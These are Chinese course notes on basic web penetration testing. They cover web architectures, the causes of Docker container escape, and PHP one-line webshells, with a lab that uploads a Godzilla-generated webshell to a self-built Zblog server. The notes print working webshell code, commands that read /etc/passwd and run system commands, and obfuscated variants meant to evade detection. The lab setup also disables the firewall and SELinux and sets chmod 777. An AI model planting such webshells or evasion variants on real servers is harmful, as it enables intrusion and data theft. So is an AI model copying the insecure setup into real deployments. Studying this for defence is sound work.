Day02 基础入门-Web架构&前后端分离站&Docker容器&集成软件站&建站分配
=
常规化
-
原理：源码数据都在同一个服务器  
影响：无，采用常规安全测试手法即可

站库分离
-
原理：源码数据库不在同服务器  
存储：其他服务器上数据库&云数据库产品  
影响：数据被单独存放，能连接才可影响数据

前后端分离
-
原理：前端JS框架，API传输数据  
影响：
1.	前端页面大部分不存在漏洞
2.	后端管理大部分不在同域名
3.	获得权限有可能不影响后端

Docker容器
-
原理：打包类集成化环境，权限配置或受控制  
影响：黑客攻击虚拟空间磁盘  
警告：Docker 容器逃逸！  

### Docker容器逃逸的原因
1. **配置不当**：
   容器以特权模式（`--privileged`）运行。
   挂载敏感目录（如`/`、`/proc`、`/dev`）。
   使用不安全的Capabilities（如`CAP_SYS_ADMIN`）。
2. **内核漏洞**：
   利用Linux内核漏洞（如脏牛漏洞、CVE-2022-0847）突破容器隔离。
3. **Docker漏洞**：
   利用Docker本身的漏洞（如CVE-2019-5736）逃逸容器。
4. **共享命名空间**：
   容器与宿主机共享命名空间（如PID、网络、IPC）。
5. **恶意镜像**：
   使用包含恶意代码的镜像，导致容器被攻击。

宝塔或Phpstudy
-
原理：打包类集成化环境，权限配置或受面板控制。  
影响：攻击者权限对此区别  

建站分配站
-
原理：利用别人域名模板建立  
影响：实质安全测试非目标资产（本质上你测试的是建站平台的服务器）  
举例：建站平台，凡科建站<https://jz.fkw.com/>  

静态Web
-
例子：Web前端设计（静态的html网页）  
原理：数据没有传输性（js传输不算）  
影响：无任何漏洞  

伪静态 <i>动态转为静态技术</i>
-
>简单来说，就是让动态网页（通常是通过服务器端脚本语言生成内容、处理请求的网页，如基于 PHP、ASP.NET等开发的网页）在外观上呈现出静态网页（直接由 HTML 文件构成，内容相对固定，无需服务器端实时处理的网页）的形式，但其本质上依然是动态网页，只是通过一定的技术手段对 URL 进行改写，使其看起来更像静态网页。

>其实现原理主要是借助服务器端的相关模块或配置，当用户访问改写后的伪静态 URL 时，服务器会根据预设的规则将该 URL 解析还原成对应的动态网页请求，然后按照正常的动态网页处理流程，如执行脚本代码、查询数据库等操作，生成相应的网页内容并返回给用户。例如，原本一个动态网页的 URL 可能是```example.com/index.php?id=123```，经过伪静态处理后变成了```example.com/article/123.html```，从形式上看更简洁、更符合搜索引擎友好以及用户友好的特点。


PHP一句话木马
-
### **PHP一句话木马的基本形式**
PHP一句话木马的核心是利用PHP的 `eval()` 函数或类似功能，执行用户输入的任意代码。以下是一个典型的一句话木马示例：

```php
<?php @eval($_POST['cmd']); ?>
```

#### 解释：
1. `<?php ... ?>`：PHP代码的起始和结束标记。
2. `@`：错误抑制符，用于隐藏可能的错误信息，增加隐蔽性。
3. `eval()`：PHP函数，用于执行字符串形式的PHP代码。
4. `$_POST['cmd']`：从HTTP POST请求中获取名为 `cmd` 的参数值。
5. 攻击者可以通过发送POST请求，将任意PHP代码传递给 `cmd` 参数，服务器会执行这些代码。

---

### **一句话木马的使用方式**
1. **上传木马文件**：
   - 攻击者通过文件上传漏洞或其他方式，将一句话木马文件上传到目标服务器。
   - 例如，将上述代码保存为 `shell.php` 并上传到服务器。

2. **连接木马**：
   - 攻击者使用工具（如中国菜刀、蚁剑、Cknife等）或手动发送HTTP请求与木马文件交互。
   - 例如，发送POST请求：
     ```http
     POST /shell.php HTTP/1.1
     Host: example.com
     Content-Type: application/x-www-form-urlencoded
     ```
     cmd=echo 'Hello, World!';
     

3. **执行任意代码**：
   - 攻击者可以通过 `cmd` 参数执行任意PHP代码，例如：
     - 查看文件：`cmd=print_r(scandir('.'));`
     - 读取文件：`cmd=echo file_get_contents('/etc/passwd');`
     - 执行系统命令：`cmd=system('whoami');`

---

### **一句话木马的变种**
为了绕过安全检测，攻击者会对一句话木马进行各种变形。以下是一些常见的变种：

#### 1. **使用 `assert()` 函数**
```php
<?php @assert($_POST['cmd']); ?>
```

#### 2. **使用 `create_function()` 函数**
```php
<?php $func = create_function('', $_POST['cmd']); $func(); ?>
```

#### 3. **使用 `preg_replace()` 函数**
```php
<?php @preg_replace('/.*/e', $_POST['cmd'], ''); ?>
```

#### 4. **使用 `file_put_contents()` 函数**
```php
<?php @file_put_contents('shell.php', $_POST['cmd']); ?>
```

#### 5. **加密或编码**
```php
<?php eval(base64_decode('ZXZhbCgkX1BPU1RbJ2NtZCddKTs=')); ?>
```
- 解码之后就是：`eval($_POST['cmd']);`

---

### **防御措施**
1. **禁用危险函数**：
   - 在 `php.ini` 中禁用 `eval()`、`assert()`、`create_function()` 等危险函数。
   - 示例：
     ```ini
     disable_functions = eval,assert,create_function,preg_replace
     ```

2. **文件上传检查**：
   - 对上传的文件进行严格的类型检查和内容扫描。
   - 禁止上传可执行文件（如 `.php`、`.jsp` 等）。

3. **输入过滤**：
   - 对所有用户输入进行严格的过滤和验证，避免直接执行用户输入的内容。

4. **Web应用防火墙（WAF）**：
   - 使用WAF检测和拦截恶意请求。

5. **定期扫描**：
   - 定期扫描服务器文件，查找可疑文件。

6. **最小权限原则**：
   - Web服务器运行用户应具有最小权限，避免攻击者获取系统控制权。




实战
-
在Windows Server 2012安装宝塔。  
宝塔可以一键安装中间件，以及Web应用程序。

在Fedora上搭建Zblog php应用程序， 并进行php一句话木马测试。

### 1.	安装Fedora Workstation  
>https://fedoraproject.org/  
### 2.	安装所需的依赖。  
```bash
dnf -y install httpd httpd-devel mysql mysql-server php php-mysqlnd php-gd libjpeg* php-ldap php-odbc php-pear php-xml php-json php-mbstring php-bcmath php-mhash php-intl
```
### 3.	设置MySQL服务自启  
```bash 
systemctl enable mysqld
systemctl start mysqld
```
### 4.	初始化MySQL  
```bash
mysql_secure_installation
```
进行MySQL首次初始化，设置root密码
### 5.	尝试登录MySQL```mysql -u root -p```
### 6.	启用httpd服务 
```bash 
systemctl enable httpd
systemctl start httpd
```
### 7.	禁用防火墙  
```bash
systemctl disable firewalld
systemctl stop firewalld
```
### 8.	关闭SeLinux  
```bash
vim /etc/selinux/config
```
>```SELINUX=```设置为```disabled```
### 9.	下载zblog源码并上传  
>目录：```/var/www/html```
### 10.	设置zblog文件夹权限  
```bash
chmod -R 777 /var/www/html/zblog
```
### 11.	安装Zblog
浏览器打开```http://ip:port/zblog/```
>根据提示安装
### 12.	生成木马
>下载ONE-FOX工具箱，运行哥斯拉v4.0.1  
>在哥斯拉v4.0.1，点击管理>生成 其他默认 有效载荷选择PhpDynamicPayload，加密器选择PHP_EVAL_XOR_BASE64.
### 13.	一句话代码格式 
```php 
<?php @eval($_POST['cmd']); ?>
```
### 14.木马实验
>把php木马保存到你能找到的地方，并将其上传到服务器，在浏览器运行  
点击目标>添加 输入URL，有效载荷选择PhpDynamicPayload， 加密器选择PHP_EVAL_XOR_BASE64.  
点击测试连接，提示Success，然后点击添加  
选中目标，右键进入，可以看到网站文件，但是看不到系统文件。   

Linux下终端全局代理
-
>把代理服务器地址写入shell配置文件```.bashrc```或者```.zshrc```
```bash
export http_proxy="http://localhost:port"  
export https_proxy="http://localhost:port" 
```
在Fedora上部署docker
-
<i>Docker 是一个开源的应用容器引擎，用于开发、部署和运行应用程序，它基于 Go 语言 并遵从 Apache2.0 协议开源，它通过容器化技术，将应用程序及其依赖项打包在一个轻量级、可移植的容器中，使应用能在不同环境中一致运行。

Docker 可以让开发者打包他们的应用以及依赖包到一个轻量级、可移植的容器中，然后发布到任何流行的 Linux 机器上，也可以实现虚拟化。

容器是完全使用沙箱机制，相互之间不会有任何接口,更重要的是容器性能开销极低。</i>
### 1.	在你的Rocky Linux上添加docker存储库
```bash 
sudo dnf -y install dnf-plugins-core，sudo dnf-3 config-manager --add-repo https://download.docker.com/linux/fedora/docker-ce.repo
```
### 2.	安装docker所需的软件包
```bash 
sudo dnf -y install docker-ce docker-ce-cli containerd.io docker-compose-plugin
```
### 3.	启动docker服务
```bash
sudo systemctl --now enable docker
```
### 4.	配置代理 <i>docker在国内需要魔法</i>
>查找``` docker.service ```文件的位置
```bash
systemctl status docker
```
>输出中的``` Loaded ```行会显示``` docker.service ```的路径，例如：
```
Loaded: loaded (/lib/systemd/system/docker.service; enabled; vendor preset: enabled)
```
>编辑``` docker.service ```文件，在``` [Service] ```部分添加代理环境变量：
```bash
sudo vim /lib/systemd/system/docker.service
```
>在``` [Service] ```部分添加如下内容：
```bash
[Service]
Environment="HTTP_PROXY=http://127.0.0.1:7890/"
Environment="HTTPS_PROXY=http://127.0.0.1:7890/"
```
>保存并退出编辑器，重载``` docker.service ```配置并重启``` Docker ```服务：
```bash
sudo systemctl daemon-reload
sudo systemctl restart docker
```

### 5.	在```hub.docker.com```查看可用的镜像。
该网站已被GFW，请自备梯子。

### 6.   docker 命令
转自<https://www.runoob.com/docker/docker-container-usage.html>

以下是常用的 Docker 客户端命令：
|命令	|功能|示例|
|-----|----|---|
|docker run|	启动一个新的容器并运行命令|	docker run -d ubuntu|
|docker ps|	列出当前正在运行的容器|	docker ps|
|docker ps -a|	列出所有容器（包括已停止的容器）|	docker ps -a|
|docker build|	使用 Dockerfile 构建镜像|	docker build -t my-image |.
|docker images|	列出本地存储的所有镜像|	docker images|
|docker pull|	从 Docker 仓库拉取镜像|	docker pull ubuntu|
|docker push|	将镜像推送到 Docker 仓库|	docker push my-image|
|docker exec|	在运行的容器中执行命令|	docker exec -it container_name bash|
|docker stop|	停止一个或多个容器|	docker stop container_name|
|docker start|	启动已停止的容器|	docker start container_name|
|docker restart|	重启一个容器|	docker restart container_name|
|docker rm|	删除一个或多个容器|	docker rm container_name|
|docker rmi|	删除一个或多个镜像|	docker rmi my-image|
|docker logs|	查看容器的日志|	docker logs container_name|
|docker inspect|	获取容器或镜像的详细信息|	docker inspect container_name|
|docker exec -it|	进入容器的交互式终端|	docker exec -it container_name /bin/bash|
|docker network ls|	列出所有 Docker 网络|	docker network ls|
|docker volume ls|	列出所有 Docker 卷|	docker volume ls|
|docker-compose up|	启动多容器应用（从 docker-compose.yml 文件）|	docker-compose up|
|docker-compose down|	停止并删除由 docker-compose 启动的容器、网络等	|docker-compose down|
|docker info|	显示 Docker 系统的详细信息|	docker info|
|docker version|	显示 Docker 客户端和守护进程的版本信息|	docker version|
|docker stats|	显示容器的实时资源使用情况|	docker stats|
|docker login|	登录 Docker 仓库	|docker login|
|docker logout|	登出 Docker 仓库|	docker logout|


Docker compose
-
<i>Compose 是用于定义和运行多容器 Docker 应用程序的工具。通过 Compose，您可以使用 YML 文件来配置应用程序需要的所有服务。然后，使用一个命令，就可以从 YML 文件配置中创建并启动所有服务。</i>

>在Docker目录中，执行以下命令来启动应用程序
```bash
docker-compose up
```
如果你想在后台执行该服务可以加上 ```-d``` 参数
```bash
docker-compose up -d
```

在Fedora中开启MySQL远程访问（外部连接）
-
### 1.	在安装MySQL数据库的主机上登录root用户：
```bash
mysql -u root -p
```
### 2.	依次执行如下命令：
```sql
use mysql; 
select host from user where user='root';
```
### 3.	将Host设置为通配符%：
```sql
update user set host = '%' where user ='root';  
```

>Host列指定了允许用户登录所使用的IP，比如```user=root``` ```Host=192.168.1.1```。这里的意思就是说root用户只能通过```192.168.1.1```的客户端去访问。 ```user=root``` ```Host=localhost```，表示只能通过本机客户端去访问。而%是个通配符，如果```Host=192.168.1.%```，那么就表示只要是IP地址前缀为```192.168.1.```的客户端都可以连接。如果```Host=%```，表示所有IP都有连接权限。   

>注意：在生产环境下不能为了省事将host设置为%，这样做会存在安全问题，具体的设置可以根据生产环境的IP进行设置。
